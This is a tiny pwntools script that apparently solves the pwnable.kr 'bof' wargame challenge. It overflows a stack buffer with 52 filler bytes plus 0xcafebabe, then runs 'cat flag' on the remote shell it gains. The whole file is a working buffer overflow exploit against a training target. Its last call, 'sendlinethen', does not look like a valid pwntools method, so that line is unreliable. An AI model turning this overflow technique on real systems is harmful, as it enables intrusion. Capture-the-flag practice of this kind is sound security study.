from pwn import *

sh = remote("pwnable.kr", 9000)
sh.sendline("A" * (32 + 16 + 4) + p32(0xcafebabe))
print sh.sendlinethen("\n", "cat flag")

# daddy, I just pwned a buFFer :)
